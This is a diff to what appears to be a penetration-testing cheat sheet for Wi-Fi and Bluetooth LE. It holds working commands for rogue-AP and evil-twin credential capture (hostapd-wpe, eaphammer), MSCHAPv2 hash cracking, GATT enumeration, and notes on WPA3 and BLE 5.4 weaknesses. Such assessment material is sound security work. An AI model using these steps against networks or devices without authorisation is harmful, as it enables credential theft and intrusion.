@@ -9,10 +9,16 @@ WPA3-SAE (Simultaneous Authentication of Equals) replaces PSK handshake with Dra
 - Offline dictionary attacks against captured handshake not feasible (no PMKID equivalent in pure WPA3).
 - Each authentication attempt requires real-time interaction.
 
-**Attack surface:**
+**Attack surface (2024+):**
 1. Transition mode (WPA2/WPA3 mixed) — most common in practice.
 2. Dragonblood side-channel (CVE-2019-9494 / CVE-2019-9496) — patched in most firmware.
-3. Downgrade attacks.
+3. Beacon protection / MFP downgrade and SAE downgrade in transition mode.
+4. SSID Confusion (CVE-2023-52424, WiSec 2024): a client authenticates to the
+   correct RSN but ends up bound to a different SSID because the SSID is not
+   authenticated in the 4-way handshake. Impact: VPN auto-disable rules that
+   trust an SSID string fire on the wrong network. Requires the two networks to
+   share credentials; useful in enterprise or roaming SSID pairs. Mitigation is
+   the 802.11 Beacon Protection amendment plus binding SSID into KDF.
 
 ---
 
@@ -69,15 +75,16 @@ No PSK — authentication via RADIUS server. Attack paths:
 3. **RADIUS credential spray**: if RADIUS accepts EAP-PEAP, spray domain credentials.
 
 ```bash
-# hostapd-wpe — rogue AP for EAP credential capture
-# Install: apt install hostapd-wpe
+# hostapd-wpe — rogue AP for EAP credential capture (Kali package or aircrack-ng patch set)
 # Edit /etc/hostapd-wpe/hostapd-wpe.conf:
-#   interface=wlan0mon, ssid=<target_ssid>, channel=<ch>
+#   interface=wlan1, ssid=<target_ssid>, channel=<ch>   (AP mode, NOT monitor)
 sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
-# Captured hashes in /var/log/hostapd-wpe.log
+# Captured hashes in ./hostapd-wpe.log (default; override with wpe_logfile=)
 
-# Crack MSCHAPv2 hashes
-hashcat -m 5600 ntlmv2_hash.txt rockyou.txt  # NTLMv2 from MSCHAPv2
+# Crack MSCHAPv2: challenge/response is NetNTLMv1-shape → hashcat -m 5500 (NOT 5600).
+hashcat -m 5500 mschapv2_hash.txt rockyou.txt
+# For a 100% crack of the NT hash regardless of password:
+#   chapcrack parse <challenge> <response>  → DES keyspace via crack.sh
 
 # eaphammer — full enterprise evil twin
 python3 eaphammer -i wlan0mon --channel <ch> --auth wpa-eap \
@@ -90,15 +97,27 @@ python3 eaphammer -i wlan0mon --channel <ch> --auth wpa-eap \
 
 ### BLE passive scan
 
+> BlueZ marks `hcitool`, `hciconfig`, `gatttool`, `sdptool`, `hcidump` as
+> **deprecated** and ships them only via the `bluez-deprecated` / `bluez-legacy`
+> subpackage. Use `bluetoothctl`, `btmgmt`, `btmon`, and `btgatt-client` on
+> current systems; keep the legacy commands only for read-only scripts on old boxes.
+
 ```bash
-# bluetoothctl (simple scan)
+# bluetoothctl (preferred on BlueZ 5.x)
 sudo bluetoothctl
 [bluetooth]# power on
-[bluetooth]# scan on   # BLE + classic
-[bluetooth]# devices   # list discovered
+[bluetooth]# scan on           # LE + BR/EDR discovery (transport per controller filter)
+[bluetooth]# devices           # list discovered
 [bluetooth]# info <MAC>
 
-# hcitool (lower-level)
+# btmgmt — management daemon control (replaces hciconfig)
+sudo btmgmt power on
+sudo btmgmt find -l            # -l = LE only
+
+# btmon — raw HCI trace (replaces hcidump)
+sudo btmon
+
+# hcitool (DEPRECATED, still present on Kali)
 sudo hciconfig hci0 up
 sudo hcitool lescan            # BLE passive scan
 sudo hcitool scan              # Classic Bluetooth scan
@@ -114,12 +133,16 @@ sudo bettercap
 ### GATT service enumeration
 
 ```bash
-# gatttool (legacy but widely available)
+# gatttool (DEPRECATED — kept for legacy scripts, unmaintained in BlueZ >= 5.44)
 gatttool -b <device_MAC> -I
 [<MAC>][LE]> connect
 [<MAC>][LE]> primary          # list GATT services by UUID
 [<MAC>][LE]> characteristics  # list characteristics with handles and properties
 [<MAC>][LE]> char-val-read <handle>   # read characteristic value
+
+# Preferred replacement: btgatt-client (BlueZ 5.x tools/ dir) or bluetoothctl's gatt.* menu.
+# sudo btgatt-client -d <device_MAC>
+# bluetoothctl → menu gatt → list-attributes / read / write / notify
 
 # bettercap (more user-friendly)
 >> ble.enum <MAC>
@@ -156,6 +179,23 @@ gatttool -b <device_MAC> -I
 # 4. Firmware extraction via BLE OTA update characteristic
 # If device accepts OTA update over BLE without auth → read firmware via DFU protocol
 ```
+
+### BLE 5.4 surface (Core Spec Jan 2023)
+
+Two new subsystems widen the attack surface for scoped assessments:
+
+- **Encrypted Advertising Data (EAD)**: advertising / scan-response / EIR payload is
+  AES-CCM'd with a Key Material (KM) exchanged over an encrypted GATT link (Key
+  Material Characteristic). Attack checks: EAD key rotation / reuse, KM leak via
+  an unauthenticated read on the KM characteristic, replay of frozen EAD blobs
+  when the tag has no `randomizer` update.
+- **Periodic Advertising with Responses (PAwR)**: bidirectional connectionless
+  channel used by ESL, sensor swarms, low-power one-to-many control. Sniff with
+  nRF Sniffer + Wireshark (>= 4.2 dissector), map subevents/response slots,
+  check whether payloads use EAD or ship plaintext, and test injection into a
+  response slot when timing is guessable.
+- Firmware/toolchain: recent `bluez` (>= 5.72), current nRF Connect SDK
+  (>= v2.5) and `nrf-sniffer-for-bluetooth-le` v4.x are needed to observe these.
 
 ### sparrow-wifi — RF survey tool
 
